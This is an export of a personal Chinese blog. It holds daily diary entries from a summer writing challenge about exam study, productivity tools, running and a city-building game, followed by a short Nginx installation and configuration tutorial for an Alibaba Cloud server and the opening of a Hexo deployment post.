<li>对软件体系进行组织和优化</li>
<li>算法设计</li>
<li>(好像没见过对软件工程过程优化的，主要是经验)</li>
</ul>
<p>参加实训 [^Kylin] 了之后，对大公司做的事情有了部分的了解。他们需要做的就是成果转化，在给定的业务需求下，使用“计算机”这种工具来达到目标。</p>
<p>计算机是人们对微观之物进行组织的外在表现形式。计算机可以感应外物，把外界信息作为数据处理。当设计好的微观组织能嵌入自然物时，自然物就被赋予了可操控的属性。这样，计算机就有了双向交流的特性。</p>
<p>计算机是我唯一要全身心致力其中的学科，我想不到我还能干其他什么事情（音乐和画画还可以）。我喜欢计算机在于我可以用简练的逻辑语言去观察、控制身边的各种事物，就像是人类的一种超能力一样。这种底层逻辑，为属于自己或属于他人的事物赋予了更多的价值。</p>
<p>[^Kylin]: 更多内容详见 <a href="#1973703782" title="【麒麟实训】开始与结束" class="record-link ">【麒麟实训】开始与结束</a><br>
今天谈论的话题是进入计算机软件行业的学习后，我对电子设备上的各种执念。</p>
<p>首先就是我有轻微“电子洁癖”。就是看到自己的电脑或手机上，出现不相关的、无用的事物时，我总眼睛痒，想把它处理干净，或优雅地藏起来。比如在电脑上安装 390<a href="%E4%BD%A0%E6%87%82%E7%9A%84">^360</a> 的某个驱动软件时（无奈啊），卸载后有残留；打开了百度共享空间后又关闭时，文件的资源管理器上多的那个图标很碍眼。诸如此类。这时候我不得不上网搜索方法，修改注册表来解决问题。但其实我觉得，这也算不上“洁癖”吧，应该是叫注重“电子卫生”。</p>
<p>第二点就是，无论是写代码或者采用手机/计算机功能时，我都需要关注它的“优雅”程度。如果代码不够优雅，我会想办法尽力改善，优秀的程序员绝不会允许自己的代码是一坨 shi 的（虽然我的代码水平也不是很优秀）。在实现计算机/手机的某些功能时，我也会关注它的实现复杂度，以便对自己设置操作进行了解和掌控。</p>
<p>再一点就是有条理的性格。文件资源管理必须有条理、代码管理必须有条理。这种“条理”性格渗透了我的学习、工作和生活。</p>
<p>最后一点就是对资源保存管理的重视。在使用新的技术、新的功能时，我会关注这个技术的永久持续性、评估他的价格与收费形式、评估自己采用的技术和资源与平台的相称性。在阿里云、腾讯云之间，采用它们各种服务前花了好多心思去研究。在云存储的选择上我也有意去进行评估。</p>
<p>以上对自己总结的几点互相之间其实有重合，我认为“优雅”应该最能概括上面的几个特点。无论在学习工作还是生活中，各种事物能够按照自己的意愿进行或在把控之中，这将是最理想的人生状态。</p>
<h1>day4 找到自己的节奏</h1>
<p>离最终的战争还有不到 150 天了，我的节奏也在稳步推进，同时也在为以后的复习节奏进行规划和管理。</p>
<ol>
<li>错题管理</li>
</ol>
<p>就在昨天，我开发出 feishu 中的一块错题管理方法，利用多维表格进行错题的分类整理。对于实际的错题拍摄到上传到多维表格的方式，还需要进一步简化和探索。feishu 的各种文档主要的特点和优势在于没有循规蹈矩直接使用金山、微软 Office 那套，而是自己开发一款更贴切大部分人习惯和审美的文档格式和工具。在这里，我看到了一个原则，之前在学习 SpringBoot 也接触过，那就是“约定大于配置”。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001708.webp" alt="image.png"></p>
<ol start="2">
<li>进度管理</li>
</ol>
<p>在错题管理之前，我还在 feishu 上进行进度的管理，利用多维表格实时展示各种资料的浏览进度，用数据表格绘制完成速率、展示预估完成的时间。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001715.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001725.webp" alt="image.png"></p>
<ol start="3">
<li>作息管理</li>
</ol>
<p>关于每天的日常作息我也正在循序渐进地改变，手机再次检查开启了各项“健康使用手机”的约定。根据舍友的作息时间，综合自身情况，在 8 月 10 日之前，我必须达到晚上 1 点为入睡时间，早上 9 点前清醒，保持足够的睡眠量。与高中备战高考相比，睡眠质量已经有比较大的改善。</p>
<ol start="4">
<li>科目管理</li>
</ol>
<p>每天的复习科目基本上有了定式：每日至少 4 小时数学 + 其他科目。安排给数学足够多的时间是必要的。</p>
<ol start="5">
<li>态度管理</li>
</ol>
<p>在备战过程中，必须关注的一个点是避免“自我感动”。做题的结果才是检验成果的保证。关于是否购买平板来做辅助学习工具的问题，在这一个月以来我都有详细的思考，也做出了我自己的最终决策。这一年花的钱不要浪费，要把它转变成对未来的投资（赚钱的那种）。</p>
<p>上面写了那么多，主要还是因为有这个活动才自己整理出来的（我没事不会自己写这类“宣言”给自己看得 😥）。今天就这样。</p>
<h1>day5 复习毛概有感</h1>
<p>好像越来越难想出今天的选题了，感觉越来越像写高中作文了咋办哈哈。实在不行干脆把我之前自己写的博客再“复述”一遍？Just Kidding. 主要是在这个板块我想写一些新的内容，激励自己产出文字并使他尽可能的有意义。我打算是把以前只写给自己看的“主题谈”板块应用到这里来，加上每日撰写的属性，这就成了一个“高级版”的日记。通过这个过程也能探索我以后的文字产出方式，并对他们产生的效果进行评估。</p>
<p>近些天来我花了一部分的时间用来整理考研政治的思维导图，结合“肖秀荣”与课本，对这个平时上课不怎么细看细想的科目进行系统的了解和学习，从而也有自己的一些体悟。</p>
<p>一个国家在诞生前多是动荡的，在这其中各种纠葛的利益中与关系中，通过各种实践加上外部因素影响，会诞生最终的赢家。一个国家的建立是对于本国民乃至世界的一个重要事件，在国家建立前期的筹备、建立后的巩固的过程中有数不尽的事情需要处理和决定。一个国家的发展需要愿景，需要自身的改良，需要在了解自身的情况以及外部环境的情况下，站在一个特殊历史结点上眺望远方。通过对《毛概》中各种思想的学习，我对自己国家能够在历史长河中诞生、成长的根本内核有了进一步的认识。</p>
<p>在一定程度上说，领导集体最能够左右国家的发展前途，他们的思想动因与变化反应出当前整个国家目前的基本状况与迫切需求。为何决策、如何选择的过程是这些重大思想中的基本内容，对国家、政党和人民的思考方式是这些思想的核心内涵。每一个能写在课本上的思想，经住了实践的考验，它带领一个民族走过了诸多的坎坷，见证了历史，正因此，他就值得每一个国人及后代铭记、汲取营养。</p>
<p>对于我来说，政治这门学科并不是枯燥的学科。了解到上述的内容后，我对它的兴趣又有了进一步的提升，在整个画思维导图的过程中我都乐在其中。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001644.webp" alt="image.png"></p>
<h1>day6 回味积累</h1>
<p>近段时间，我对我高中时期所摘抄的各种文字进行了整理，并再次回味这些文字时隔多年仍带给我的触动。</p>
<blockquote>
<p>吹灭读书灯，一身都是月</p>
</blockquote>
<p>这的意境是我所追求的。努力学习一整天，当走出图书馆自习室那一刻，整个人都是满足的。在最温柔的时刻月光能够给你最后的陪伴。</p>
<blockquote>
<p>浅蓝色的夜溢进窗来 夏斟得太满</p>
</blockquote>
<p>这里的蓝给我更多的感受是故乡的傍晚那种深邃的蓝。学校这里应该改为“亮黄色的光充满屋里，晨来得太早！”。</p>
<blockquote>
<p>记忆既不是短暂易散的云雾，也不是干爽的透明，而是烧焦的生灵在城市表面结成的痂，是浸透了不再流动的生命液体的海绵，是过去、现在与未来混合而成的果酱，把运动中的存在给钙化封存起来。</p>
<p>记忆是一条早已干涸的河流，只在毫无生气的河床中剩下零落的硕石。——《三体》刘慈欣</p>
</blockquote>
<p>两个摘录对记忆的描述都有着共同之处，记忆无非就是轰轰烈烈物质运动与化学反应下剩下的残渣，是多年的建筑或战争扫过剩下的灰尘，是废弃的水库干涸后露出的孕育多年的生灵沉积，是海里的珊瑚，是贝壳中的珍珠。</p>
<p>回看这些高中时期的积累，仿佛也是在解封被钙化的思想，整理孤零零的顽石，触碰那道痂。同时我也反思自己，大学以来纸质文学作品阅读量大幅下降，积累的文摘量大幅减小。考研之后，我将抽取更多的娱乐时间，视文字与游戏、电影、音乐一样同等看待，以这几年积攒的阅历触碰更多的灵魂。</p>
<p>今天的小日记结束，接下来我要去享受“美好崩坏的艺术了（即饮食艺术，梁文道。我的理解就是吃饭）”。</p>
<h1>day 7 休息一天</h1>
<p>早上五点起床做核酸，又注定是劳累困顿的一天。虽然上周也没忙啥，昨天平板刚到。周围很多人都在这个时间点回去了。这对于我来说是一个赶超的好时机，但同时也为自己的松懈找到了一点理由。在接下来的 5 个月中，我应该如何保持自己的节奏？</p>
<ol>
<li>少看短视频，严格遵守健康管理手机的规定</li>
<li>周运动量保持。最好一周 5 天。运动后的时间利用，可以背单词或做自己的自我整理</li>
<li>生理习惯自律，保证良好的睡眠</li>
</ol>
<p>忽然想到一个道理，一个很古老并通常都被人提到的道理，我到现在才有一种醒悟。那就是关于达成目标的问题：</p>
<ol>
<li>达成目标需要拆分出许多个计划</li>
<li>每一个计划要足够细，并且可行</li>
</ol>
<p>相信周围无数人都是这么说的，对于我自己一直以来我也都只是听听而已，但真没有放在心上。参加实训的时候我有感触，就是“领导”更多关注于任务的拆分与风险评估，这样才能够保证任务达到预定的目标。对于我来说，考研上岸似乎是一个模糊但又艰巨的目标，这就需要我每日的计划并严格实施来进行保证。</p>
<p>想到好像是在择业指导中的一门课中提到的一个例子，崭露头角的明星被问到你的目标是什么，她回答到 10 年后我要成为 XXX，但是当设想 5 年后、3 年后、1 年后的自己应该是什么样的时候，她就觉得时间开始紧迫起来了。一样的道理，我要需要紧迫感，为了能在环境中更好的生存，拥有更强的竞争实力，以及完善丰富自己，我还需要不断努力。</p>
<p>最后，为了舒缓一下我对于 💸 的焦虑：💸 你有的是时间赚，现在要抓紧的是正事。当然我不会逼迫自己忘掉这种焦虑的想法，我会与他进行共处，真正的释缓应该是平和解决，因为这样才能够得到真的解决。</p>
<h1>day 8 电子洁癖</h1>
<p>昨天休息了一天是有成果的。买的华为二代笔到了，探索一下笔的使用与手写笔软件的选择。其中，有一大部分时间用来解决笔记的同步问题。</p>
<p>“享做笔记”支持 webdav 协议。我想让它使用微软 onedrive 进行数据备份 (保持与 xmind 使用一样的网盘，提高数据整洁)。按照多种教程也没能连接成功 (使用上网技巧也不行)。</p>
<p>在哔哩哔哩中搜到一个视频，他使用了一个支持 webdav 协议的日本的网盘，墙内，空间也挺大的。但是我想到自己的笔记数据放在陌生的国外存储器上 (何况是日本)，感觉不卫生。</p>
<p>国内坚果云是很不错的，但是缺点就在于流量太少了。免费用户一个月上传流量才 1G，计算下来一天 300 多 M，略少。</p>
<p>兜转来兜转去，最后干脆使用国内的吧。一开始使用百度云，现在想想还是使用华为的吧。百度云对于我来说就是个文件中转站而已，我的重要资料不会放上去 (欸，原来我已经把它当成一个“空间大的垃圾桶”看待了)。</p>
<p>想到其实 Xmind 使用 onedrive 的原因解决的是 Xmind 多端同步的问题。备份数据我还指望阿里云进行永久云端保存。享做笔记完全可以直接使用它的备份导出功能，而不需苛求云同步 (云同步功能使用不佳)。</p>
<p>至此，我的笔记数据布局应该是这样的：</p>
<ol>
<li>学习笔记目前全在 onenote，以 onedrive 作为数据可靠性的依托</li>
<li>xmind 包含思维导图，以 onedrive 作为媒介与可靠性依托，最终可靠性依赖于阿里云盘</li>
<li>手写笔记依靠华为云盘进行存储。目前而言，并没有产生出重要的手写笔记</li>
</ol>
<p>顺便一提的是，关于我的数据文件。云盘布局目前是这样的：</p>
<ol>
<li>阿里云盘作为日后生活与生产的主力</li>
<li>115 盘暂停上传新文件，但保留相当数量的历史文件</li>
<li>腾讯微云保存一些上古时期的文件</li>
<li>魅族云盘可能有保存残留</li>
<li>百度网盘为随见随捡的垃圾 (放错位置的资源) 桶</li>
</ol>
<h1>day 9 平板进度 (2/3)</h1>
<p>买了个平板键盘，第二天早上就收到了。各项方面都还不错，很遗憾的是触屏版使用不佳，加上试用后发现其实对触屏版的需求不大，遂打算退货。</p>
<p>再逛一圈京东，发现根本没有符合自己要求的键盘。我的要求就是我现在退货的这个键盘再减少一个触屏版功能就行。然而找了一圈，包括目前这个键盘所出售的店都没有。我的关键要求是：</p>
<ul>
<li>有硅胶保护套。保护很重要。</li>
<li>有笔槽。没笔放可不行。</li>
<li>平板可分离，横竖自由放置 (一般就是磁吸类型的)。随时取下来写写画画。</li>
<li>不要触控板。不需要，省钱。</li>
</ul>
<p>但是基本上都是只差一个条件 😓。现在就只能进行取舍了。</p>
<p>此外，我的考研计划开始初步完善，每天的学习任务可以用 0️⃣1️⃣2️⃣3️⃣ 进行概括。</p>
<ul>
<li>学 0️⃣ 星内容：政治、英语等课内内容以及课外拓展内容</li>
<li>数学 1️⃣ 大章：尽可能完成一个知识点的复习</li>
<li>专业课 2️⃣ 章：推进两小节进度</li>
<li>英语单词持续^3️⃣^(你也看出来了吧主要就是凑序号)：每天单词不停歇</li>
</ul>
<p>这样的要求符合当前的实际情况，反映出时段的要求，稳步推进复习的进度。不过这三天持续早晨核酸，我的部分睡眠时间搬到了 10 点到 13 点，影响了我的正常午餐时间。在以后无大筛的日子里，还需要保持正常的睡眠时间。</p>
<p>走到今天，我感觉自己的状态开始变好了。睡眠、运动基本保障。心那一块没有异常感觉。继续保持住吧。这开学前的 10 来天可是黄金复习时间！</p>
<h1>day 10 谈谈运动</h1>
<p>近段时间，我每周进行了 2 到 3 次的长跑运动。与以往的时期相比，在暑假里我好像变得更加积极投入到长跑锻炼中。我想主要包括以下原因：</p>
<ul>
<li>在备战阶段我需要更加注意身体，利用 1 个小时的时间锻炼，益脑。</li>
<li>近期不适的警醒。近期出现了心脏部位的不适。考虑到家族史，锻炼十分迫切且必要。此外，这个阶段的锻炼将归为“续命跑”的范畴。</li>
<li>精神动力的支撑。因为自己被一个人深深地影响了，这种内在的动力迫使我改变自己的习惯，塑造更完美的自己。</li>
</ul>
<p>在运动过程中，虽然累，但也谈不上特别累。每次长跑后做完拉伸运动，会有一种成就感。并且现在这个阶段，体育场没有那么多人，没有人踢足球，来跑步的都是真正想要跑步的。</p>
<p>在跑步过程中，我发现酷狗脖挂式的运动耳机很出色，跑的时候很稳固，没有听诊器效应。跑两千米，大概可以完整听 2 至 3 首歌。</p>
<p>以前跑完后都没有做跑后拉伸。这次有意识并按指导做了，虽然动作可能有些地方不到位，但是效果还是不错的，大腿酸胀感消失很快。</p>
<p>关于计划在晚上（入睡前两个小时）进行跑步，有一下好处：</p>
<ul>
<li>气温合适，无阳光影响</li>
<li>人员少，隐蔽性增加</li>
<li>有可能改善睡眠</li>
<li>时间紧迫感，迫使自己提早完成学习计划</li>
</ul>
<p>虽然但是，因为昨晚的事情（tw question）还是有一点小失眠。新的键盘订单已经下了，舍弃了“拥有硅胶保护套”这一要点购买了一款更便宜的键盘。之前我一直担心这样的键盘不能和平板一起放进保护套。但是在这个商品的评论与问答区找到了实实在在的答案。看起来效果也不错，希望今天就能用上，并且体验满意。</p>
<h1>day 11 七夕意识流</h1>
<p>今天七夕节。对于我来说，除了能放假的节日，好像其它节日都与我无关，今天和其它 300 多天一样，就是平平常常的一天。反而，今天我意识到我的专业课复习进度的滞后性。我的专业课进度有点落后了，为了快马加鞭赶回来，我也在夏季学期开学和秋季学期开学中设立两个主要的时间节点，以保证我的进度能够按时完成。上一次这样设置时间节点还是在七月下旬。当时数学进度严重滞后，不得不逼自己每天一章，赶在 8 月前完成基础一轮。从现在来看，当初的任务完成情况是达到预期的，但这样也牺牲了专业课的复习时间。在每日 0️⃣1️⃣2️⃣3️⃣ 目标设立后，各项进度都有所增长，但单项来看并不算高，因此在时间把控和效率上我还需要额外的把控。</p>
<p>昨天一天很劳累，浅浅透支了自己。今天上午断断续续把觉补了回来。今天晚上还需要补一下昨天漏掉的专业课进度，争取超过 50%（35%）那条线。</p>
<p>自从使用了飞书的事项管理功能，感觉生活的条理度又多了点。与其它的事项提醒工具相比，飞书这个更纯粹，更简单。在很多情况下，我们不需要许多复杂的功能。另外它的“重复提醒”功能很好用。说到这，我不得不佩服飞书的产品经理以及背后的研发团队，能用心制造一款好用的工具，到目前为止我还没发现飞书有什么重要的缺点。这已经达到了我愿意付费的满意程度。我觉得一款好工具就应该这样，提供免费使用后，如果工具本身足够优秀，自然会有人愿意消费。</p>
<p>待会就开始鏖战了，感叹一下，5 分钟进入状态这个法则很有用。</p>
<h1>day 12 呼啸</h1>
<p>这两天极其酷热，空气都是闷的，走出室外瞬间感受到口渴。幸好室内空调能续命。昨天晚上走出教室，大风直接把门拉开。天上看不见月亮，还隐约有点云层反射，感受到了一丝雨滴，但我还是决定骑向了体育场。</p>
<p>体育场的风很大，我特地把书包放在雨可能淋不到的地方。天空是不是微闪，多是大雨来临前的前兆。但即使是这样，篮球场还是有人在打篮球，跑道上还是有人在坚持跑步。思考了一下，今天的跑步计划就不变吧，还是两公里，身体最重要。</p>
<p>一路上，乘着风和逆着风的感觉都很酷。戴着耳机，音乐伴随着呼啸声，配上《Mountains》的感觉简直不要太爽。飞舞的安全线与倒下的路锥构成的景象别有风味。虽然为了抗风可能跑步时多做了一点功，但明显感觉身体的带汉感大大减小。跑后拉伸区域里的蚊子也少多了。</p>
<p>所以在大风刮起的半个小时内，还是可以正常安全地完成跑步计划的。</p>
<p>除了昨晚的天气，在设备上我还发现了一个问题，就是耳机的清洁问题。最近的耳朵十分不好受，每天都要戴耳塞和耳机。这些涉耳设备的清洁引起了我的重视。在拆卸蓝牙耳机耳塞时，意外弄掉了一个“网”。一开始我以为是蓝牙耳机的关键部件弄坏了，但在淘宝上搜时，它其实也只是一个需要定时更换的配件：耳机防尘网（点赞一波淘宝搜索功能，多打一个网字就能搜索到）。除了耳机，近期要对耳塞进行一波冲洗，保护用耳卫生。</p>
<p>平板部件 3/3 已经送到学校，期待今天的开箱体验。在平板配件收集完成之后，平板快速输入 Latex 公式的问题就能够解决，整个复习体验将会变得十分顺畅 [^pb]。</p>
<p>[^pb]: 兜兜转转自己 DIY，不如直接买官方原装皮套......这不 2024 年直接就买原装，只不过买的是国际版的，还得自己 DIY 键盘贴......</p>
<h1>day 13 提前休息，建设城市</h1>
<p>昨天一天玩了一款刚下的游戏，城市·天际线（这名字我老是写错，“都市”，“天地线”排列组合）。</p>
<p>以往我们接触的造城市游戏无非就是那些烂大街的国产“模拟经营”类游戏。但这个游戏和那一些根本就不在一个层次上（steam 原价 292RMB，现价 68RMB）。</p>
<p>这款游戏在于造一个城市。第一局，不会玩，探索，结果濒临破产。知道个大概后，重开第二局（没看攻略）城市蒸蒸日上，其实我也高估了游戏的难度。</p>
<p>它对城市的模拟很真实，尤其是交通。因为各种交通设计我都能在现实世界中找到原型，各种问题的解决方法我都能在现实世界中借鉴到答案。比如单行路、环岛、高速公路的设置，公交、地铁、火车的设置，以及各种过路费的设置……</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001526.webp" alt="image.png|300"></p>
<p>每次设置工业区，我也总能想到我所处的城市，我见过的工业区都是怎么安排的。在区域划分上也隐约回忆以前高中所学的地理知识（城市部分）。我也理解了为什么钦州市郊、其他城市的市郊都会预先建设好基础设施，比如不会使用的十字路口、荒郊野岭的地铁站、高新技术开发区、远郊的大学城。我感觉，其实想市长等城市建设者，不也是再玩一盘更大的“游戏”么，只不过这款“游戏”更加复杂，代价更大，需要精心设计好每个环节。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001540.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001548.webp" alt="image.png"></p>
<p>与《文明 6》一样，人类文明模拟器游戏总能给自己一定的启发，加深对我们所处的现实世界的理解。和《缺氧》相比，它不需要复杂的管道、电子、自动化等理工的东西，它需要学习的是统筹管理与规划的方法，是偏人文类的知识。</p>
<p>总得来说，这款游戏加深了我对现实世界城市建设的理解，对我有很大的启发。说实在的，玩的第一局失败时还并没有强烈感受到有多好玩。但是我也隐隐感受到它是一个十分棒的作品，以至于某天我还念念不忘（梦里好像还梦到），从而开启了昨天一天的游玩。</p>
<h1>day 14 在任何地方都应该学到东西</h1>
<p>唉，没错，今天又玩了大半天天际线。在交通上搞了一阵。结束的时候，赶上死亡潮，人一群群死光。我发现，交通规划才是最核心的东西！立交桥的设计是值得学习的，现在想来，有时间我可以好好学习一下各种立交桥的设计、名字、解决痛点以及在我国中应用的案例。</p>
<p>似乎，一个好的游戏作品可以鼓励你学习更多的知识。也许游戏最本初的属性是带给人轻松和快乐，但如果它本应能给你更多，就应该抓住机会钻研。游戏是作品，作品就应该赏析和学习。以后有时间，我应该专门设一个专栏，为这些知识做笔记。</p>
<p>回想自己以前也有过类似的触动：</p>
<ul>
<li>我的世界。（五六年级）红石机制，是我开始接触逻辑电路的学习，打开电子电路的大门。为此我还弄了一本画册记录。大二学习数字逻辑与数字电路时甚至用了红石符号做了笔记。命令机制，简单接触游戏内指令代码编写。</li>
<li>莫斯密码。</li>
</ul>
<p>除此之外，未来我还可以从游戏里学到哪些？对于这些作品我还可以有哪些探讨？</p>
<ul>
<li>纪念碑谷。总结一下使用的视错觉点。学习那个基本三角形，了解它的历史。赏析关卡。</li>
<li>各种解谜游戏涉及的谜题了解。（针对那些小谜题谜题比较通式化的地方）</li>
<li>艾迪芬奇的记忆。族谱与关卡设计总结，赏析。家庭梳理。</li>
<li>城市·地平线中立交桥设计学习</li>
<li>扫雷。什么二一减法。</li>
</ul>
<p>对于游戏我还有一个观点，那就是每一个涉及解谜的游戏背后，有它的套路和数学基础。有些套路紧扣关卡主题，可能不易被挖掘出定式。但我玩的横版过关游戏也不少了，尝试找出来那就最好不过了。</p>
<h1>附：bilibili 专栏暑期日更挑战活动</h1>
<p>活动链接： <a href="https://www.bilibili.com/blackboard/guguking2022-7.html">2022专栏暑假日更挑战 (bilibili.com)</a></p>
<p>打卡过程中每天预估自己能瓜分到的金额：</p>
<table>
<thead>
<tr>
<th>活动天数</th>
<th>前一日完成打卡人数</th>
<th>全勤人数</th>
<th>全勤额外奖预计瓜分</th>
</tr>
</thead>
<tbody>
<tr>
<td>8</td>
<td>1789</td>
<td>568</td>
<td>8.8 ￥</td>
</tr>
<tr>
<td>9</td>
<td>1852</td>
<td>543</td>
<td>9.21 ￥</td>
</tr>
<tr>
<td>10</td>
<td>1481</td>
<td>422</td>
<td>11.85 ￥</td>
</tr>
<tr>
<td>11</td>
<td>1897</td>
<td>409</td>
<td>12.22 ￥</td>
</tr>
<tr>
<td>12</td>
<td>1832</td>
<td>392</td>
<td>12.76 ￥</td>
</tr>
<tr>
<td>13</td>
<td>1868</td>
<td>388</td>
<td>12.89 ￥</td>
</tr>
<tr>
<td>14</td>
<td>1646</td>
<td>379</td>
<td>13.19 ￥</td>
</tr>
<tr>
<td>最终全勤人数</td>
<td></td>
<td>366</td>
<td>13.66 ￥</td>
</tr>
</tbody>
</table>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001324.webp" alt="image.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001418.webp" alt="image.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001435.webp" alt="image.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001449.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016001457.webp" alt="image.png|475"></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1973703782">
                            <a href="#1973703782">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>【麒麟实训】开始与结束</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^Kylin]: 更多内容详见 <a href="#1973703782" title="【麒麟实训】开始与结束" class="record-link highlight">【麒麟实训】开始与结束</a><br>
今天谈论的话题是进入计算机软件行业的学习后，我对电子设备上的各种执念。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3437638411">
                            <a href="#3437638411">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>本地文件夹的多端同步</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^Xmind]: 应该是这篇文章 <a href="#3437638411" title="本地文件夹的多端同步" class="record-link highlight">本地文件夹的多端同步</a>，不过现在的文章内容可能有改版和修正。</p>
<h1>day2 我对我所学专业的一点思考</h1>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="107080905" class="record">
            <header>
                <h1 class="record-title">Nginx 的安装与反向代理配置</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Nginx');">Nginx</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                    <button class="btn" onclick="activeTag('ECS');">ECS</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/13/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/nginx1-cover.svg</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>阿里云安装与配置 Nginx。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>661ecc9</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>精通 Nginx，学其它的 Apache、Tomcat 更轻松。</p>
</blockquote>
<h1>安装 Nginx</h1>
<blockquote>
<p><strong>环境信息</strong>：<br>
CPU&amp;内存：1 核 (vCPU)2 GiB<br>
操作系统：Alibaba Cloud Linux 3.2104 64 位<br>
实例规格：ecs.n4.small<br>
实例规格族：共享计算型<br>
刚刚初始化云盘的 ECS 服务器。</p>
</blockquote>
<p>运行以下命令安装 Nginx</p>
<pre><code class="language-bash">dnf -y install http://nginx.org/packages/centos/8/x86_64/RPMS/nginx-1.22.1-1.el8.ngx.x86_64.rpm 
</code></pre>
<p>您可以访问 <a href="https://nginx.org/packages/centos/8/x86_64/RPMS/">Nginx官方安装包</a> 获取适用于 CentOS 8 系统的多版本的 Nginx 安装包。</p>
<p>运行以下命令查看 Nginx 版本。</p>
<pre><code class="language-sh">nginx -v
</code></pre>
<p>启动 Nginx 服务：</p>
<pre><code class="language-sh">systemctl start nginx
</code></pre>
<p>在本地电脑的浏览器输入主机地址并访问，出现 Nginx 默认页面即成功。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230409141117412.png" alt="image-20230409141117412"></p>
<h1>反向代理的配置</h1>
<p>找到 nginx.conf 文件进行配置，一般在 <code>/etc/nginx</code> 目录下。但我遇到一个问题，就是配置文件没有 server 字段。于是我参考了 <a href="https://blog.csdn.net/qq_37283570/article/details/112854376">这篇文章</a>。最终在 <code>/etc/nginx/conf.d/default.conf</code> 中找到了。</p>
<p>修改配置文件，设定好网站的根目录：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230408205637757.png" alt="image-20230408205637757"></p>
<p>重启 Nginx：</p>
<pre><code class="language-sh">systemctl restart nginx
# 或 nginx -s reload # 不用重启nginx
# 或 systemctl reload nginx
</code></pre>
<p>你可以在服务器上对应自己设置的根目录创建文本文件，如 <code>xiazai.txt</code>，然后浏览器访问网址 <code>&lt;服务器主机IP&gt;/xiazai.txt</code> 进行测试。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://help.aliyun.com/document_detail/464754.html?spm=a2c4g.472049.0.0.6a8d4de5bhOeVO">CentOS 8 自建安装 Nginx+Mysql环境+PHP环境 (aliyun.com)</a></li>
<li><a href="https://blog.csdn.net/github_38336924/article/details/82756779">Linux Nginx 配置/绑定域名_nginx配置域名_dadeity的博客-CSDN博客</a></li>
<li><a href="https://www.runoob.com/w3cnote/nginx-setup-intro.html">Nginx 配置详解 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://www.cnblogs.com/davidkam/p/3507082.html">Nginx多域名多Server反向代理配置 - davidkam - 博客园 (cnblogs.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2201181434">
                            <a href="#2201181434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                </span>
                                
                                <span>博客域名解析管理与网站 CDN 加速域名配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>可参考这篇文章：<a href="#107080905" title="Nginx 的安装与反向代理配置" class="record-link highlight">Nginx 的安装与反向代理配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="181570378" class="record">
            <header>
                <h1 class="record-title">部署 Hexo 个人博客框架到服务器</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('ECS');">ECS</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/13/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/hexowordpresscover546546.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>将博客框架Hexo部署到ECS服务器。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>ad28b4a</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>前言</h1>
<h2>我为什么要从 Wordpress 换为 Hexo</h2>
